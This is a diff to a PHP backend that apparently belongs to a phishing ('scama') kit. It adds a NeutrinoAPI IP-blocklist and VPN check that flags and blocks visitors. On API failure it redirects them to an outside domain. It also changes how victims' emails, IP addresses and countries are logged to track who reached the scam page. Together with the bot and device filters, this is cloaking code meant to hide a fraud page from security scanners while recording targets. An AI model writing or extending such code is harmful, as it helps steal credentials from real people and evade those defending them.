@@ -5,12 +5,15 @@ use MaxMind\Db\Reader;
 use DeviceDetector\DeviceDetector;
 use DeviceDetector\Parser\Device\AbstractDeviceParser;
 
+$neutrinoAPIClient = new NeutrinoAPI\NeutrinoAPIClient($_ENV['NEUTRINOAPI_USER_ID'], $_ENV['NEUTRINOAPI_API_KEY']);
+
+
 function get_client_ip()
 {
     $ipaddresstrue = '';
 
     if (getenv('REMOTE_ADDR') == '127.0.0.1') {
-        $ipaddresstrue = '45.126.185.232';
+        $ipaddresstrue = '105.214.34.213';
     } else {
 
         if (getenv('HTTP_CLIENT_IP'))
@@ -26,10 +29,11 @@ function get_client_ip()
         else if (getenv('REMOTE_ADDR'))
             $ipaddresstrue = getenv('REMOTE_ADDR');
         else
-            $ipaddresstrue = '45.126.185.232';
+            $ipaddresstrue = '105.214.34.213';
     }
     return trim($ipaddresstrue);
 }
+
 
 function getCountry()
 {
@@ -50,7 +54,53 @@ function getCountry()
     return $result;
 }
 
-function insertVisitor($origin, $linkscama, $blocked, $email)
+
+
+function check_neutrinoapi_api()
+{
+
+    global $neutrinoAPIClient;
+
+    $params = array(
+
+        // An IPv4 or IPv6 address. Accepts standard IP notation (with or without port number), CIDR
+        // notation and IPv6 compressed notation. If multiple IPs are passed using comma-separated values
+        // the first non-bogon address on the list will be checked
+        "ip" => get_client_ip(),
+
+        // Include public VPN provider IP addresses. NOTE: For more advanced VPN detection including the
+        // ability to identify private and stealth VPNs use the IP Probe API
+        "vpn-lookup" => "true"
+    );
+
+    $apiResponse = $neutrinoAPIClient->ipBlocklist($params);
+
+    if ($apiResponse->isOK()) {
+        $data = $apiResponse->getData();
+
+        $blocked = false;
+
+        foreach ($data as $key => $value) {
+            if ($value === true) {
+                $blocked = true;
+                break;
+            }
+        }
+
+        if ($blocked === true) {
+            return 'YES';
+        } else {
+            return 'NO';
+        }
+    } else {
+        header("Location: https://api.erroryall.com", TRUE, 301);
+    }
+};
+
+
+
+
+function insertVisitor($origin, $linkscama, $blocked, $by_check)
 {
     $country = getCountry();
     $ip = $country['ip'];
@@ -61,7 +111,7 @@ function insertVisitor($origin, $linkscama, $blocked, $email)
 
     global $conn;
 
-    $sql = "INSERT INTO visitor (ips, code_country, country, origin, scama, date,blocked,email) VALUES (:ip,:country_code,:country_name,:origin,:linkscama,:date,:blocked,:email)";
+    $sql = "INSERT INTO visitor (ips, code_country, country, origin, scama,date,blocked,by_check) VALUES (:ip,:country_code,:country_name,:origin,:linkscama,:date,:blocked,:by_check)";
     $stmt = $conn->prepare($sql);
     $stmt->bindParam(':ip', $ip);
     $stmt->bindParam(':country_code', $country_code);
@@ -70,7 +120,7 @@ function insertVisitor($origin, $linkscama, $blocked, $email)
     $stmt->bindParam(':linkscama', $linkscama);
     $stmt->bindParam(':date', $date);
     $stmt->bindParam(':blocked', $blocked);
-    $stmt->bindParam(':email', $email);
+    $stmt->bindParam(':by_check', $by_check);
     $stmt->execute();
     $stmt->closeCursor();
 
@@ -89,6 +139,10 @@ function deviceBot()
     } else {
         return 'NO';
     }
+}
+
+function check_ip_accpt(){
+
 }
 
 function ipbot()
@@ -112,12 +166,13 @@ function ipbot()
     return $result_array;
 }
 
-function  Insert_scama($linkscama, $emailVisitor)
+function  insert_scama($linkscama, $emailVisitor)
 {
     global $conn;
     $ip = get_client_ip();
-    $sql = "INSERT INTO visitor_scama (link_scama,email_visitor,	created_at,last_activity) VALUES (:link_scama,:email_visitor,NOW(),NOW())";
+    $sql = "INSERT INTO visitor_scama (ips,link_scama,email_visitor,created_at,last_activity) VALUES (:ip,:link_scama,:email_visitor,NOW(),NOW())";
     $stmt = $conn->prepare($sql);
+    $stmt->bindParam(':ip', $ip);
     $stmt->bindParam(':link_scama', $linkscama);
     $stmt->bindParam(':email_visitor', $emailVisitor);
     $stmt->execute();
@@ -125,29 +180,29 @@ function  Insert_scama($linkscama, $emailVisitor)
     return $conn->lastInsertId();
 }
 
-function compare_scama($email)
+function compare_scama()
 {
     global $conn;
-    $sql = "SELECT * FROM visitor_scama WHERE email_visitor = :email_visitor";
+    $sql = "SELECT * FROM visitor_scama WHERE ips = :ips";
     $stmt = $conn->prepare($sql);
-    $stmt->bindParam(':email_visitor', $email);
+    $stmt->bindParam(':ips', get_client_ip());
     $stmt->execute();
     $stmt->setFetchMode(PDO::FETCH_ASSOC);
     $result = $stmt->fetchAll();
     $stmt->closeCursor();
     if (count($result) > 0) {
-        return true;
+        return "YES";
     } else {
-        return false;
+        return "NO";
     }
 }
 
-function result_scama($email)
+function result_scama()
 {
     global $conn;
-    $sql = "SELECT * FROM visitor_scama WHERE email_visitor = :email_visitor";
+    $sql = "SELECT * FROM visitor_scama WHERE ips = :ips";
     $stmt = $conn->prepare($sql);
-    $stmt->bindParam(':email_visitor', $email);
+    $stmt->bindParam(':ips', get_client_ip());
     $stmt->execute();
     $stmt->setFetchMode(PDO::FETCH_ASSOC);
     $result = $stmt->fetchAll();
